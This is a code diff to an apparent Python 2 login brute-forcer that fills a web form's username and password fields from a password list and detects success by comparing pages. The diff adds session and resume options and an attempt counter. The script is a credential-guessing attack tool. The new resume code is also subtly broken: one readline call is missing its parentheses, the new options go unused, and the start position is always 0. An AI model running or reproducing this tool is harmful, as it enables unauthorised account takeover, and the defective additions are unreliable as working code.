@@ -4,7 +4,12 @@
 # licensed under the Affero General Public License version 3 or later. See
 # the COPYRIGHT file.
 
-import sys, argparse, string, urllib2, os.path, difflib
+import os.path
+import sys
+import urllib2
+
+import argparse
+import difflib
 try:
 	from ClientForm import ParseResponse, ControlNotFoundError
 except ImportError:
@@ -23,6 +28,10 @@ argsParser.add_argument("-r", "--checkURL", dest="checkURL", type=str,
 						help="url to check instead of the form url (usually not needed)")
 argsParser.add_argument("-s", "--sensitivity", dest="sensitive", type=float, default=10,
 						help="Set the sensitivity of the difference to a logged-in page and non-logged-in page")
+argsParser.add_argument("-S", "--session", dest="sessionName", type=str,
+						help="Session name to resume brooken attempts")
+argsParser.add_argument("-R", "--resume", dest="resumeName", type=str,
+						help="Session name to resume")
 argsParser.add_argument("-c", "--check", dest="justCheck", action="store_const",
 						const=True, default=False, help="Switch to inspect the form")
 args = argsParser.parse_args()
@@ -30,6 +39,7 @@ args = argsParser.parse_args()
 COOKIEFILE = 'cookies.lwp'
 open(COOKIEFILE, "w").write("#LWP-Cookies-2.0")
 
+PASSWORDATTEMPTNUMBER = 0
 
 def collectFormInfo(url): ## collects form/forms data and returns as a list of objects
 	request = urllib2.Request(url)
@@ -121,7 +131,8 @@ def checkIfLoggedIn(oldPage, url, sensitive): ## method to check it the current 
 
 
 
-def inputInfo(userFieldName, passFieldName, username, form, url, sensitive):  ## where the magic happens
+def inputInfo(userFieldName, passFieldName, username, form, url, sensitive, startPos):  ## where the magic happens
+	PASSWORDATTEMPTNUMBER = 0
 	cj = None
 	ClientCookie = None
 	cookielib = None
@@ -158,6 +169,9 @@ def inputInfo(userFieldName, passFieldName, username, form, url, sensitive):  ##
 	password = passwordFile.readline().strip() ## read the first password in the file and strip any spaces at beginning and end
 	oldDiff = -1 # Set an initial value for the oldDiff
 	print "Working"
+	while PASSWORDATTEMPTNUMBER != startPos:
+		PASSWORDATTEMPTNUMBER += 1
+		password = passwordFile.readline.strip()
 	while password: ## Loop until we reach the end of the file or find a good match
 		form[userFieldName] = username ## fill out the form
 		form[passFieldName] = password
@@ -176,6 +190,8 @@ def inputInfo(userFieldName, passFieldName, username, form, url, sensitive):  ##
 		attempt.close() ## close the connection
 		for index, cookie in enumerate(cj): ## save current cookies
 			cj.save(COOKIEFILE)
+		PASSWORDATTEMPTNUMBER += 1
+		print PASSWORDATTEMPTNUMBER
 		password = passwordFile.readline().strip() ## read next password
 	passwordFile.close() ## at the end of the file close it
 
@@ -189,7 +205,7 @@ def main(url, args): ## gather info in one place and conduct program
 	userField, passField, correctForm = parseFormInfo(forms) ## return the form names and form object
 	if args.checkURL:
 		url = args.checkURL
-	inputInfo(userField, passField, args.user, correctForm, url, args.sensitive) ## make the magic happen
+	inputInfo(userField, passField, args.user, correctForm, url, args.sensitive, 0) ## make the magic happen
 
 
 main(args.urlLocation, args)
